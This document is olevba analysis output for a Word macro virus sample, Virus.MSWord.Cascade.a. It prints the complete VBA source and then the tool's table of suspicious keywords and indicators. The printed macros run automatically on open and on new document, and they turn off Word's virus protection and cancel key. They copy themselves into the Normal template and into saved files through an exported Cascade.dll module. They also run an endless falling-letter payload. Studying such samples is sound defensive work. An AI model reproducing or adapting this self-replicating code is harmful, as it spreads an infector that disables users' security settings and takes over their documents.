olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cascade.a-3f18ffcde35908fa7418e2e5e2633d7387b435cb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cascade.a-3f18ffcde35908fa7418e2e5e2633d7387b435cb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cascade.bas 
in file: Virus.MSWord.Cascade.a-3f18ffcde35908fa7418e2e5e2633d7387b435cb - OLE stream: 'Macros/VBA/Cascade'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAN
MsgBox "Une CASCADE de lettre  va s'afficher sur votre écran...", vbInformation, "Virus Cascade"
Call PayCascade
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroNormCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "Cascade" Then
        CascadeInstalled = -1
    End If
Next i
If Not CascadeInstalled Then
    ActiveDocument.VBProject.VBComponents("Cascade").Export "C:\Windows\Cascade.dll"
    NormalTemplate.VBProject.VBComponents.Import "C:\Windows\Cascade.dll"
End If
ErrorAO:
End Sub
Sub FileNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFN
    Dialogs(wdDialogFileNew).Show
MsgBox "Je suis de retour...", vbInformation, "Virus Cascade"
Call PayCascade
ErrorFN:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
NormalTemplate.VBProject.VBComponents("Cascade").Export "C:\Windows\Cascade.dll"
ActiveDocument.VBProject.VBComponents.Import "C:\Windows\Cascade.dll"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub PayCascade()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPC
Début:
Randomize
Dim Lettre$, Nombre$
Nombre$ = Int(Rnd * 26) + 1
If Nombre$ = "1" Then Lettre$ = "A"
If Nombre$ = "2" Then Lettre$ = "B"
If Nombre$ = "3" Then Lettre$ = "C"
If Nombre$ = "4" Then Lettre$ = "D"
If Nombre$ = "5" Then Lettre$ = "E"
If Nombre$ = "6" Then Lettre$ = "F"
If Nombre$ = "7" Then Lettre$ = "G"
If Nombre$ = "8" Then Lettre$ = "H"
If Nombre$ = "9" Then Lettre$ = "I"
If Nombre$ = "10" Then Lettre$ = "J"
If Nombre$ = "11" Then Lettre$ = "K"
If Nombre$ = "12" Then Lettre$ = "L"
If Nombre$ = "13" Then Lettre$ = "M"
If Nombre$ = "14" Then Lettre$ = "N"
If Nombre$ = "15" Then Lettre$ = "O"
If Nombre$ = "16" Then Lettre$ = "P"
If Nombre$ = "17" Then Lettre$ = "Q"
If Nombre$ = "18" Then Lettre$ = "R"
If Nombre$ = "19" Then Lettre$ = "S"
If Nombre$ = "20" Then Lettre$ = "T"
If Nombre$ = "21" Then Lettre$ = "U"
If Nombre$ = "22" Then Lettre$ = "V"
If Nombre$ = "23" Then Lettre$ = "W"
If Nombre$ = "24" Then Lettre$ = "X"
If Nombre$ = "25" Then Lettre$ = "Y"
If Nombre$ = "26" Then Lettre$ = "Z"
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, Lettre$, "Impact", 55#, msoFalse, msoFalse, Int(Rnd * 450), 10).Select
Pos = Int(Rnd * 50) + 10
For n = 0 To 50 Step Pos
For i = 1 To 800000
Next i
Selection.ShapeRange.IncrementTop 10 + n
Next n
GoTo Début
ErrorPC:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Cascade.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

